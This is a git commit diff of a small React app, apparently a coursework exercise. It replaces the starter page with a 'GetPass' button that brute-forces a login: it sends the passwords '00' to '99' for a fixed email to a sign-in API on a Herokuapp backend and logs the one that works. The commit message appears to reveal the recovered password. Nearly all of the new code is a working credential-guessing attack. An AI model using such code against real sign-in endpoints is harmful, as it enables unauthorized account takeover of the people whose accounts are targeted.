82d8681e24d000bcf9394d2e95f58c8d491751cf
Igor Piskizhev <zybrec07@gmail.com>
2022-04-09 10:38:55 +0300

    myPassIs17

--- src/App.jsx
+++ src/App.jsx
@@ -1,43 +1,10 @@
-import { useState } from 'react'
-import logo from './logo.svg'
-import './App.css'
+import GetPass from './components/GetPass'
 
-function App({ prop1 }) {
-  const [count, setCount] = useState(0)
-
+function App() {
   return (
     <div className="App">
       <header className="App-header">
-        {prop1}
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>Hello Igor + React!</p>
-        <p>
-          <button type="button" onClick={() => setCount( c => c + 1)}>
-            count is: {count}
-          </button>
-        </p>
-        <p>
-          Edit <code>App.jsx</code> and save to test HMR updates.
-        </p>
-        <p>
-          <a
-            className="App-link"
-            href="https://reactjs.org"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Learn React
-          </a>
-          {' | '}
-          <a
-            className="App-link"
-            href="https://vitejs.dev/guide/features.html"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Vite Docs
-          </a>
-        </p>
+      <GetPass email='igorp@mail.com'/>
       </header>
     </div>
   )
---
+++ src/components/GetPass.jsx
@@ -0,0 +1,34 @@
+function fetchPass(password,email){
+  fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
+    method: 'POST',
+    headers: {
+      Accept: 'application/json',
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      email,
+      password,
+    }),
+  }).then((response) => {
+    if (response.ok) {
+        console.log('PASSWORD: ', password);
+    }
+    throw Error;
+  }).catch((err)=>{
+      console.log('err',err);
+  })
+}
+
+export default function GetPass({...prop}){
+  const myEmail = prop.email;
+  return (
+    <button type="button" onClick={()=>{
+    for (let index = 0; index < 100; index += 1) {
+      const correctPass = index.toString().padStart(2, 0);
+      fetchPass(correctPass,myEmail);
+    }
+    }}>
+      Click for get Pass in console
+    </button>
+  )
+}
